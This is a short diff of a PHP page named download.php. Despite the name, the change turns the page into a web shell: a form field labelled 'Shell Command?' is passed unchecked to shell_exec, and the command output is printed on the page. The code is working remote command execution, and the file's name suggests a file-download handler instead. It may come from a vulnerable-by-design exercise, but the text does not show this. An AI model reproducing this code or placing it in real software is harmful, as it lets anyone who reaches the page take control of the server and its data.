@@ -1,15 +1,22 @@
 <!DOCTYPE html>
 <form action="download.php" method="post">
-Datei? <input type="text" name="command">
+Shell Command? <input type="text" name="command">
+<input type="submit">
+</form>
+
+<!DOCTYPE html>
+<form action="download.php" method="post">
+Datei? <input type="text" name="filename">
 <input type="submit">
 </form>
 
 <?php
-$file = $_POST["command"];
+$command = $_POST["command"];
+$file = $_POST["filename"];
 
 
 echo "<pre>";
-echo shell_exec($file);
+echo shell_exec($command);
 echo "</pre>";
 
 
